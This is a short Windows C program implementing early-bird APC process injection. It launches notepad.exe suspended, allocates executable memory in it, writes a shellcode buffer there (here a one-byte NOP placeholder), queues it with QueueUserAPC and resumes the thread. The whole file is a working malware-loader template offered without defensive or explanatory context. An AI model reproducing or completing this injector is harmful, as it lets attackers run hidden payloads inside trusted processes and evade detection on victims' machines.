#include <Windows.h>

// shellcode
unsigned char buf[] = { 0x90 };

int main() {
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE vProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;

	LPVOID sAddress = VirtualAllocEx(vProcess, NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apc = (PTHREAD_START_ROUTINE)sAddress;

	WriteProcessMemory(vProcess, sAddress, buf, sizeof(buf), NULL);
	QueueUserAPC((PAPCFUNC)apc, threadHandle, NULL);
	ResumeThread(threadHandle);

	CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

	return 0;
}